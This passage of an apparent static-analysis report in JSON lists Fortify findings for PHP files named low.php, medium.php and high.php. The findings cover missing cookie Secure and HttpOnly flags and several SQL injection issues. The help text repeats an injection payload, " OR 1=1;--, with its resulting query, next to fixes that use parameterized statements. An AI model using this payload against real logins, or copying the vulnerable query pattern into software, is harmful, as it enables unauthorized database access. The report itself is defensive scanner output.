            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4635/?engineType=SCA&issue=AE5AD817092BDB9F94874585E45ABF8F"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4386",
          "shortDescription" : {
            "text" : "Cookie Security: Cookie not Sent Over SSL"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie without setting the <code>Secure</code> flag to <code>true</code>\n\n\n"
          },
          "help" : {
            "text" : "Modern web browsers support a Secure flag for each cookie. If the flag is set, the browser will only send the cookie over HTTPS. Sending cookies over an unencrypted channel can expose them to network sniffing attacks, so the secure flag helps keep a cookie's value confidential. This is especially important if the cookie contains private data or carries a session identifier.\n  \n\nExample 1: The following code adds a cookie to the response without setting the Secure flag.\n\n...\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\");\n...\n\n\nIf an application uses both HTTPS and HTTP, but does not set the Secure flag, cookies sent during an HTTPS request will also be sent during subsequent HTTP requests. Attackers may then compromise the cookie by sniffing the unencrypted network traffic, which is particularly easy over wireless networks.\n\nSet the Secure flag on all new cookies in order to instruct browsers not to send these cookies in the clear. This can be accomplished by passing true as the sixth argument to setcookie().\n\nExample 2: The following code corrects the mistake in Example 1 by setting the Secure flag to true.\n\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);\n\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4386/?engineType=SCA&issue=11DEFD463DC3E515219521BBFBD9DD6B"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4587",
          "shortDescription" : {
            "text" : "Cookie Security: HTTPOnly not Set"
          },
          "fullDescription" : {
            "text" : "The program creates a cookie in medium.php on line 7, but fails to set the <code>HttpOnly</code> flag to <code>true</code>.\n\n\n"
          },
          "help" : {
            "text" : "All major browsers support the HttpOnly cookie property that prevents client-side scripts from accessing the cookie. Cross-site scripting attacks often access cookies in an attempt to steal session identifiers or authentication tokens. Without HttpOnly enabled, attackers have easier access to user cookies.\n  \nIn this case, a cookie is set in medium.php on line 7, but the HttpOnly parameter is not set or is set to false.\n  \n\nExample 1: The following code creates a cookie without setting the HttpOnly property.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE);  //Missing 7th parameter to set HttpOnly\n\n\nEnable the HttpOnly property when you create cookies. You can do this by setting the HttpOnly parameter in the setcookie() call to true.\n\nExample 2: The following code creates the same cookie as the code in Example 1, but this time sets the HttpOnly parameter to true.\n\nsetcookie(\"emailCookie\", $email, 0, \"/\", \"www.example.com\", TRUE, TRUE);\n\n\nSeveral mechanisms to bypass setting HttpOnly to true have been developed, and therefore it is not completely effective.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4587/?engineType=SCA&issue=8E318B4A96B209CB1BE5BDA0119B5E3E"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4522",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 19 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in high.php on line 19.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4522/?engineType=SCA&issue=6508A7BF5A1F9A5BC1F7D3BAC771F14D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4740",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 19 of high.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in high.php on line 19.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4740/?engineType=SCA&issue=F22F5A676B00BDD0033C29570151F880"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4566",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 17 of low.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in low.php on line 17.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4566/?engineType=SCA&issue=7D66310E40EDE6C7306D2062FFC93F9C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4749",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 17 of low.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in low.php on line 17.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4749/?engineType=SCA&issue=F6A1BEC8B249221E3EF723823443735D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4447",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 19 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in medium.php on line 19.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName = \"\"\n  OR 1=1;\n  -- \"AND pass=\"\";\n\n\nSince OR 1=1 causes the where clause to always evaluate to true and the double hyphens cause the rest of the statement to be treated as a comment, the query becomes logically equivalent to the much simpler query:\n\n\n  SELECT * FROM users;\n\n\n\nOne traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from an allow list of safe values or identify and escape a list of potentially malicious values (deny list). Checking an allow list can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, implementing a deny list is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers may:\n\n    - Target fields that are not quoted\n    - Find ways to bypass the need for certain escaped metacharacters\n    - Use stored procedures to hide the injected metacharacters\n\nManually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.\n\nAnother solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.\n\nThe root cause of a SQL injection vulnerability is the ability of an attacker to change context in the SQL query, causing a value that the programmer intended to be interpreted as data to be interpreted as a command instead. When a SQL query is constructed, the programmer knows what should be interpreted as part of the command and what should be interpreted as data. Parameterized SQL statements can enforce this behavior by disallowing data-directed context changes and preventing nearly all SQL injection attacks. Parameterized SQL statements are constructed using strings of regular SQL, but where user-supplied data needs to be included, they include bind parameters, which are placeholders for data that is subsequently inserted. In other words, bind parameters allow the programmer to explicitly specify to the database what should be treated as a command and what should be treated as data. When the program is ready to execute a statement, it specifies to the database the runtime values to use for each of the bind parameters without the risk that the data will be interpreted as a modification to the command.\n\nExample 2: When connecting to MySQL, parameterized SQL statements should always be used instead of dynamically concatenating user supplied input, as follows:\n\n\n  ...\n  $mysqli = new mysqli($host,$dbuser, $dbpass, $db);\n  $userName = $_SESSION['userName'];\n  $itemName = $_POST['itemName'];\n  $query = \"SELECT * FROM items WHERE owner = ? AND itemname = ?\";\n  $stmt = $mysqli-&gt;prepare($query);\n  $stmt-&gt;bind_param('ss',$username,$itemName);\n  $stmt-&gt;execute();\n  ...\n\n\nThe MySQL Improved extension (mysqli) is available for PHP5 users of MySQL. Code that relies on a different database should check for similar extensions.\n\nMore complicated scenarios, often found in report generation code, require that user input affect the structure of the SQL statement, for instance by adding a dynamic constraint in the WHERE clause. Do not use this requirement to justify concatenating user input to create a query string. Prevent SQL injection attacks where user input must affect command structure with a level of indirection: create a set of legitimate strings that correspond to different elements you might include in a SQL statement. When constructing a statement, use input from the user to select from this set of application-controlled values.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4447/?engineType=SCA&issue=37AE1279E8B571005C80D6BF68D9CC7C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4710",
          "shortDescription" : {
            "text" : "SQL Injection: Poor Validation"
          },
          "fullDescription" : {
            "text" : "Line 19 of medium.php invokes an SQL query built using input coming from an untrusted source and uses HTML, XML, or other types of encoding that is not always enough to prevent malicious characters from being inserted into the query.\n\n\n"
          },
          "help" : {
            "text" : "The use of encoding functions such as mysql_real_escape_string() will prevent some, but not all SQL injection vulnerabilities. Relying on such encoding functions is equivalent to using a weak deny list to prevent SQL injection and might allow the attacker to modify the statement's meaning or to execute arbitrary SQL commands. Since it is not always possible to determine statically where input will appear within a given section of dynamically interpreted code, the Fortify Secure Coding Rulepacks may present validated dynamic SQL data as \"SQL Injection: Poor Validation\" issues, even though the validation may be sufficient to prevent SQL Injection within that context.\n\nSQL injection errors occur when:\n\n1. Data enters a program from an untrusted source.\n\n\n\n2. The data is used to dynamically construct a SQL query.\n\n\nIn this case, the data is passed to mysqli_query() in medium.php on line 19.\n\n\nExample 1: The following example demonstrates how the configuration of the database can alter the behavior of mysqli_real_escape_string(). When the SQL mode is set to \"NO_BACKSLASH_ESCAPES\" the backslash character is treated as a normal character, and not an escape character[5]. Since mysqli_real_escape_string() takes this into account, the following query is vulnerable to SQL injection as \" is no longer escaped to \\\" due to the database configuration.\n\n\n  mysqli_query($mysqli, 'SET SQL_MODE=\"NO_BACKSLASH_ESCAPES\"');\n  ...\n  $userName = mysqli_real_escape_string($mysqli, $_POST['userName']);\n  $pass = mysqli_real_escape_string($mysqli, $_POST['pass']);\n  $query = 'SELECT * FROM users WHERE userName=\"' . $userName . '\"AND pass=\"' . $pass. '\";';\n  $result = mysqli_query($mysqli, $query);\n  ...\n\n\nIf an attacker leaves the password field blank and enters \" OR 1=1;--  for userName the quotation marks will not be escaped and the resulting query is as follows:\n\n\n  SELECT * FROM users\n  WHERE userName 